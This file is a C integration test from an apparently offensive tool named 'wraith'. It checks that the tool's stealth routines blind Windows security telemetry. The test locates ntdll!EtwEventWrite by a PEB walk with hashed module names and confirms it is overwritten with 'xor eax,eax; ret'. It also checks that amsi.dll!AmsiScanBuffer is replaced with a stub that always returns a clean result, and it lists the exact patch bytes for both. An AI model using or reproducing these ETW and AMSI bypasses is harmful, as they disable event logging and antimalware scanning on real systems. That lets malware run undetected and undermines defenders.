/*
 * tests/integration/test_etw_amsi_patch.c
 *
 * Verifies ETW userland silencing + AMSI short-circuit.
 *
 * ETW assertion (mandatory under wine + Windows):
 *  - Locate ntdll!EtwEventWrite via PEB walk.
 *  - Snapshot the first 3 bytes (any non-stub prologue).
 *  - Call wraith_patch_etw().
 *  - Verify the first 3 bytes are now `33 c0 c3` (xor eax,eax;ret).
 *
 * AMSI assertion (best-effort, skipped if amsi.dll missing):
 *  - Try wraith_patch_amsi(). On wine64 amsi.dll may not exist; we
 *  accept WRAITH_E_RT_API_NOT_RESOLVED as "skip".
 *  - When the call succeeds, verify the first 14 bytes of
 *  amsi.dll!AmsiScanBuffer match the published stub.
 */

#include "wraith/wraith.h"
#include "wraith/wraith_stealth.h"

#include "runtime/rt_pebwalk.h"
#include "runtime/rt_resolver.h"
#include "stealth/hashing/hash_djb2.h"

#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>

static const uint8_t kEtwStub[]  = { 0x33, 0xC0, 0xC3 };
static const uint8_t kAmsiStub[] = {
  0x48, 0x8B, 0x44, 0x24, 0x30,
  0xC7, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x33, 0xC0,
  0xC3
};

static int test_etw(void)
{
  void *ntdll = NULL;
  if (wr_pebwalk_find_module(wr_djb2_a("ntdll.dll"), &ntdll) != WRAITH_OK
  || !ntdll) {
  fprintf(stderr, "FAIL: ETW: PEB walk for ntdll\n");
  return -1;
  }
  void *etw = NULL;
  if (wr_resolver_lookup_a(ntdll, "EtwEventWrite", &etw) != WRAITH_OK
  || !etw) {
  fprintf(stderr, "FAIL: ETW: cannot resolve EtwEventWrite\n");
  return -1;
  }

  uint8_t pre[3];
  memcpy(pre, etw, sizeof(pre));
  /* If pre already equals the stub we'd skip the verify - re-running
  * a patched binary should still report PASS. */

  wraith_status_t rc = wraith_patch_etw();
  if (rc != WRAITH_OK) {
  fprintf(stderr, "FAIL: ETW: wraith_patch_etw() -> %s\n",
  wraith_status_string(rc));
  return -1;
  }
  if (memcmp(etw, kEtwStub, sizeof(kEtwStub)) != 0) {
  fprintf(stderr,
  "FAIL: ETW bytes after patch: %02x %02x %02x\n",
  ((uint8_t *)etw)[0], ((uint8_t *)etw)[1],
  ((uint8_t *)etw)[2]);
  return -1;
  }
  printf("PASS: EtwEventWrite patched to xor eax,eax;ret "
  "(was %02x %02x %02x)\n",
  pre[0], pre[1], pre[2]);
  return 0;
}

static int test_amsi(void)
{
  /* Skip if amsi.dll is not loadable (common under wine prefixes). */
  HMODULE probe = LoadLibraryW(L"amsi.dll");
  if (!probe) {
  printf("SKIP: amsi.dll not present in this environment\n");
  return 0;
  }
  /* Don't FreeLibrary - keep it pinned so the patched bytes stay live. */

  wraith_status_t rc = wraith_patch_amsi();
  if (rc == WRAITH_E_RT_API_NOT_RESOLVED) {
  printf("SKIP: amsi.dll loaded but AmsiScanBuffer missing\n");
  return 0;
  }
  if (rc != WRAITH_OK) {
  fprintf(stderr, "FAIL: AMSI: wraith_patch_amsi() -> %s\n",
  wraith_status_string(rc));
  return -1;
  }

  void *target = NULL;
  if (wr_resolver_lookup_a(probe, "AmsiScanBuffer", &target) != WRAITH_OK
  || !target) {
  fprintf(stderr, "FAIL: AMSI: post-patch resolve failed\n");
  return -1;
  }
  if (memcmp(target, kAmsiStub, sizeof(kAmsiStub)) != 0) {
  fprintf(stderr, "FAIL: AMSI bytes don't match stub\n");
  return -1;
  }
  printf("PASS: AmsiScanBuffer patched to AMSI_RESULT_CLEAN stub\n");
  return 0;
}

int main(void)
{
  if (test_etw() != 0) {
  return 1;
  }
  if (test_amsi() != 0) {
  return 1;
  }
  return 0;
}
